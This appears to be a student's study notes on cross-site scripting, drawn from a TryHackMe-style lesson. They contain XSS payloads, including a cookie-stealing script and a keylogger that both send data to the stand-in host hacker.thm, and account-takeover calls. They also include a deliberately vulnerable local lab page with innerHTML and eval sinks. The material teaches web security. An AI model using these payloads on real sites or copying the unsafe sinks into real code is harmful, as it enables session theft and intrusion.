
>[!quote] Definition
> Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.

example of XSS:
- [XSS found in Shopify](https://hackerone.com/reports/415484)
- [$7,500 for XSS found in Steam chat](https://hackerone.com/reports/409850)
- [$2,500 for XSS in HackerOne](https://hackerone.com/reports/449351)
- [XSS found in Infogram](https://hackerone.com/reports/283825)

***Payload*** is the JS code we wish to be executed on the targets computer.

Two parts to the payload:
- **Intention**: what you want the code to do?
- **Modification**: what changes will you make to execute it for every scenario?



## Intentions

### Proof Of Concept
"asserting dominance" lol
>This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website (Check for the vulnerability existence).

```html
<script>alert('XSS');</script>
```


### Session Stealing
>Details of a user's session, such as login tokens, are often kept in cookies on the targets machine.

```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

this encodes the targets cookies then posts it to the attacker website, which let's the attacker hijack the session


### Key Logger
>anything you type on the webpage will be forwarded to a website under the hacker's control.

```html
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

### Business Logic
>This attack depends on the website code. Every website have different code, but the general idea is to use one of the website internal functions.

```html
// here this might work if this function exist on the target website
<script>user.changeEmail('attacker@hacker.thm');</script>
// or maybe
<script>account.update({email: 'attacker@hacker.thm'})</script>


// more examples


```
#### code example
```html
<!DOCTYPE html>

<html lang="en">

<head>

  <meta charset="UTF-8" />

  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>JS injection lab (local only)</title>

  <link rel="stylesheet" href="styles.css" />

</head>

<body>

  <header class="banner">

    <strong>Local lab only.</strong> Do not deploy or expose this page. It is deliberately unsafe for learning XSS / JS injection.

  </header>

  

  <main>

    <h1>JavaScript injection playground</h1>

    <p class="lead">

      Each section sends your input into a dangerous sink. Try payloads like

      <code>&lt;img src=x onerror=alert(1)&gt;</code> (innerHTML) or

      <code>alert(1)</code> (eval / Function).

    </p>

  

    <section class="lab" id="lab-innerhtml">

      <h2>1. <code>innerHTML</code></h2>

      <p>Browser parses HTML; event handlers run as script.</p>

      <form id="form-innerhtml">

        <label for="input-innerhtml">Reflection (innerHTML)</label>

        <input id="input-innerhtml" type="text" autocomplete="off" placeholder="Try HTML / onerror" />

        <button type="submit">Reflect</button>

      </form>

      <div class="output" id="out-innerhtml" aria-live="polite"></div>

    </section>

  

    <section class="lab" id="lab-eval">

      <h2>2. <code>eval()</code></h2>

      <p>Your string is executed as JavaScript (classic code-injection sink).</p>

      <form id="form-eval">

        <label for="input-eval">Code passed to eval</label>

        <input id="input-eval" type="text" autocomplete="off" placeholder="alert('eval')" />

        <button type="submit">Run</button>

      </form>

      <pre class="output mono" id="out-eval"></pre>

    </section>

  

    <section class="lab" id="lab-function">

      <h2>3. <code>new Function()</code></h2>

      <p>Body of a function is built from your input; same class of bug as eval.</p>

      <form id="form-function">

        <label for="input-function">Function body</label>

        <input id="input-function" type="text" autocomplete="off" placeholder="return 40+2" />

        <button type="submit">Run</button>

      </form>

      <pre class="output mono" id="out-function"></pre>

    </section>

  

    <section class="lab" id="lab-hash">

      <h2>4. URL hash reflection</h2>

      <p>

        Open this page with a hash, e.g.

        <code id="hash-example"></code>

        then click load.

      </p>

      <button type="button" id="btn-hash">Load hash into DOM (unsafe)</button>

      <div class="output" id="out-hash" aria-live="polite"></div>

    </section>

  </main>

  

  <script src="app.js"></script>

</body>

</html>
```

```js
(function () {

  "use strict";

  

  var hashExample = document.getElementById("hash-example");

  if (hashExample) {

    hashExample.textContent =

      window.location.pathname +

      window.location.search +

      "#<img src=x onerror=alert('hash')>";

  }

  

  document.getElementById("form-innerhtml")?.addEventListener("submit", function (e) {

    e.preventDefault();

    var v = document.getElementById("input-innerhtml").value;

    document.getElementById("out-innerhtml").innerHTML = v;

  });

  

  document.getElementById("form-eval")?.addEventListener("submit", function (e) {

    e.preventDefault();

    var v = document.getElementById("input-eval").value;

    var out = document.getElementById("out-eval");

    try {

      out.textContent = "Result: " + String(eval(v));

    } catch (err) {

      out.textContent = "Error: " + err.message;

    }

  });

  

  document.getElementById("form-function")?.addEventListener("submit", function (e) {

    e.preventDefault();

    var v = document.getElementById("input-function").value;

    var out = document.getElementById("out-function");

    try {

      var fn = new Function(v);

      out.textContent = "Result: " + String(fn());

    } catch (err) {

      out.textContent = "Error: " + err.message;

    }

  });

  

  document.getElementById("btn-hash")?.addEventListener("click", function () {

    var raw = window.location.hash.slice(1);

    var decoded = decodeURIComponent(raw.replace(/\+/g, " "));

    document.getElementById("out-hash").innerHTML = decoded;

  });

})();
```

```css
:root {

  --bg: #0f1419;

  --surface: #1a2332;

  --border: #2d3d52;

  --text: #e6edf3;

  --muted: #8b9cad;

  --accent: #58a6ff;

  --warn-bg: #3d2914;

  --warn-border: #d4a017;

  --danger: #f85149;

}

  

*,

*::before,

*::after {

  box-sizing: border-box;

}

  

body {

  margin: 0;

  min-height: 100vh;

  font-family: "Segoe UI", system-ui, sans-serif;

  background: var(--bg);

  color: var(--text);

  line-height: 1.5;

}

  

.banner {

  background: var(--warn-bg);

  border-bottom: 1px solid var(--warn-border);

  color: #f0e6c8;

  padding: 0.65rem 1.25rem;

  font-size: 0.9rem;

}

  

main {

  max-width: 44rem;

  margin: 0 auto;

  padding: 1.5rem 1.25rem 3rem;

}

  

h1 {

  font-size: 1.65rem;

  font-weight: 600;

  margin: 0 0 0.5rem;

}

  

.lead {

  color: var(--muted);

  margin: 0 0 2rem;

}

  

.lead code {

  font-size: 0.85em;

}

  

h2 {

  font-size: 1.1rem;

  margin: 0 0 0.5rem;

}

  

.lab {

  background: var(--surface);

  border: 1px solid var(--border);

  border-radius: 8px;

  padding: 1.1rem 1.15rem;

  margin-bottom: 1.25rem;

}

  

.lab p {

  margin: 0 0 1rem;

  color: var(--muted);

  font-size: 0.95rem;

}

  

form {

  display: flex;

  flex-wrap: wrap;

  gap: 0.5rem;

  align-items: flex-end;

  margin-bottom: 0.75rem;

}

  

label {

  width: 100%;

  font-size: 0.8rem;

  color: var(--muted);

  text-transform: uppercase;

  letter-spacing: 0.04em;

}

  

input[type="text"] {

  flex: 1;

  min-width: 12rem;

  padding: 0.5rem 0.65rem;

  border: 1px solid var(--border);

  border-radius: 6px;

  background: var(--bg);

  color: var(--text);

  font-size: 0.95rem;

}

  

input:focus {

  outline: 2px solid var(--accent);

  outline-offset: 1px;

}

  

button {

  padding: 0.5rem 1rem;

  border: 1px solid var(--accent);

  border-radius: 6px;

  background: rgba(88, 166, 255, 0.15);

  color: var(--accent);

  font-weight: 600;

  cursor: pointer;

  font-size: 0.9rem;

}

  

button:hover {

  background: rgba(88, 166, 255, 0.28);

}

  

.output {

  min-height: 2.5rem;

  padding: 0.65rem 0.75rem;

  border-radius: 6px;

  background: var(--bg);

  border: 1px dashed var(--border);

  word-break: break-word;

}

  

.output.mono {

  font-family: ui-monospace, "Cascadia Code", monospace;

  font-size: 0.85rem;

  white-space: pre-wrap;

}

  

code {

  font-family: ui-monospace, "Cascadia Code", monospace;

  font-size: 0.88em;

  color: var(--accent);

  background: rgba(88, 166, 255, 0.08);

  padding: 0.12em 0.35em;

  border-radius: 4px;

}

  

.lab h2 code {

  background: transparent;

  padding: 0;

}
```


## Reflected XSS

>[!quote] Definition
> Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

**Example Scenario:**  
  
A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the **error** parameter in the query string and is built directly into the page source.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/a5b0dbc4d2f1f69988f82f2c5d53f6ed.png)  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/7f90b73106d655b07874943f93533f7b.png)  

The application doesn't check the contents of the **error** parameter, which allows the attacker to insert malicious code.

  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/66743e9fa50b4c5793f070eb505f72d1.png)  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24e50d95cecfc3783bd1a3a4fecbf310.png)  

The vulnerability can be used as per the scenario in the image below:

![[Pasted image 20260503235114.png]]

### How to test for Reflected XSS?
You'll need to test every possible point of entry; these include:

- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers (although unlikely exploitable in practice)


## Stored XSS

the XSS payload is **stored on the web application** (in a database, for example) and then gets run when other users visit the site or web page.

>[!info]- Example Scenario
> A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

![[Pasted image 20260503235712.png]]


### How to test for Stored XSS:  

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:  

- Comments on a blog
- User profile information  
- Website Listings